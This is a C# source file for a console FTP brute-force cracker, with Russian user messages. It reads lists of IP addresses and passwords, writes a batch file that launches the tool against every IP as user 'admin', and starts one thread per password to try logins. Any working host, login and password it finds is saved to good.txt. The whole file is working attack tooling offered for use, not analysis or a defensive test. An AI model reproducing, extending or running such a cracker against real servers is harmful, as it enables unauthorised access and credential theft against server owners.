using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Threading;
namespace FTP_Cracker
{
    class Program
    {
        public static readonly string DIR_BASE = AppDomain.CurrentDomain.BaseDirectory;
        static   bool Testando = false;
       static string senha = "";
     static   void Logar(string Host, string Usuario, string Senha)
        {
            if (Testando == true)
            {
                FtpWebRequest request = (FtpWebRequest)FtpWebRequest.Create("ftp://" + Host + "/");
                request.Credentials = new NetworkCredential(Usuario, Senha);
                try
                {
                    request.Method = WebRequestMethods.Ftp.ListDirectory;
                    request.Credentials = new NetworkCredential(Usuario, Senha);
                    request.GetResponse();
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[ * ] Логин: " + Usuario + " Пароль: " + Senha + " успешно подошли!");
                    using (StreamWriter sw = System.IO.File.AppendText("good.txt"))
                    {
                        sw.WriteLine($"Вход: ftp://{Host}\nЛогин: {Usuario}\nПароль: {Senha}");

                    }
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[ * ] Логин: " + Usuario + " Пароль: " + Senha + " не подошли!");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    return;
                }
                senha = Senha;
                Console.ForegroundColor = ConsoleColor.DarkCyan;
            }
        }
       static void TentarLogin(string host , string login, string Arquivo)
        {
            try
            {
                string[] Senhas = File.ReadAllLines(Arquivo);
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("" + Senhas.Count() + " загруженных паролей!");
                Testando = true;
                for (int i = 0; i < Senhas.Count(); i++)
                {
                    if (Testando == true)
                    {
                        CriarThreadLogin(host, login, Senhas[i]);
                    }
                    else { break; }
                }
               
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Ошибка при загрузке паролей!");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
            }

        }
        static void CriarThreadLogin(string Host, string Usuario, string Senha)
        {
            Thread t = new Thread(() => Logar(Host, Usuario, Senha));
            t.Start();
        }
        static void CriarThreadWord(string Arquivo, string Host, string Usuario)
        {
            Thread t = new Thread(() => TentarLogin(Host, Usuario, Arquivo));
            t.Start();
        }
        static void Escrever(string str, ConsoleColor cor = ConsoleColor.White)
        {
            int Count = str.Count();
            ConsoleColor cBackup = Console.ForegroundColor;
            Console.ForegroundColor = cor;
            for (int i = 0; i < Count; i++)
            {
                Console.Write(str[i]);
                Thread.Sleep(1);
            }
            Console.WriteLine("");
            Console.ForegroundColor = cBackup;
        }
        static void Main(string[] args)
        {
            if (!File.Exists("results.txt"))
            {
                File.Create("results.txt");
                Console.WriteLine("1) Чтобы программа работала, в файл results.txt необходимо добавить IP-адреса.");
                Console.WriteLine("2) После создания и добавления ip-адресов программа сделает файл start.bat - запускать надо его.");
                Console.WriteLine("3) После того, как процесс брута завершится, необходимо удалить весь текст из results.txt и вставить новые IP-адреса, так же удалить .bat файл, чтобы программа могла снова его сделать.");
                Console.WriteLine("\n\nЕсли Вы всё прочли - перезапустите программу!");
                Console.ReadLine();
            }
            if (!File.Exists("pass.txt"))
            {
                Console.WriteLine("Вы забыли создать файл с паролями для брута!");
                Console.WriteLine("Так и быть, мы это сделаем за Вас.");
                File.Create("pass.txt");
                Console.WriteLine("Файл pass.txt успешно создан! Перезапустите программу!");
                Console.ReadLine();
            }
            if (!File.Exists("start.bat"))
            {
                var results = File.ReadAllText("results.txt");
                var passwords = File.ReadAllText("pass.txt");
                if (results.Length < 3)
                {
                    Console.WriteLine("Файл results.txt совершенно пустой! Ну ты чего? А где IP-адреса?");
                    Console.ReadLine();
                }
                if (passwords.Length < 3)
                {
                    Console.WriteLine("Файл pass.txt совершенно пустой! Ну ты чего? А где список паролей для брута?");
                    Console.ReadLine();
                }
                string[] ips = File.ReadAllLines(DIR_BASE + "results.txt");
                foreach (string ip in ips)
                {
                    Console.WriteLine($"{ip} добавлен в список.");
                    using (StreamWriter sw = System.IO.File.AppendText(DIR_BASE + "start.bat"))
                    {
                        sw.WriteLine($"ftphell.exe {ip} admin pass.txt");

                    }
                }
                Console.Clear();
                Console.WriteLine("Запустите start.bat");
                Console.ReadLine();
            }

            try
            {
                string Alvo = args[0];
                Console.WriteLine("Адрес: " + Alvo);
                string Usuario = args[1];
                Console.WriteLine("Логин: " + Usuario);
                string ArquivoSenha = args[2];
                if (ArquivoSenha == "" || Alvo == "" || Usuario == "")
                {
                    Console.WriteLine("Вы пытаетесь запустить без аргументов!");
                    Console.WriteLine("ftphell.exe <хост> <пользователь> pass.txt");
                    Console.WriteLine("Пример: ftphell.exe 192.168.1.1 admin pass.txt");
                }
                if (!File.Exists(ArquivoSenha))
                {

                    Escrever("Файл не найден.");
                }
                else
                {

                    CriarThreadWord(ArquivoSenha, Alvo, Usuario);
                }


                
            }catch(Exception ex){
                Escrever("Вы пытаетесь запустить без аргументов!");
                Escrever("ftphell.exe <хост> <пользователь> pass.txt");
                Escrever("Пример: ftphell.exe 192.168.1.1 admin pass.txt");
            }
            Console.ForegroundColor = ConsoleColor.DarkCyan;
        }
    }
}
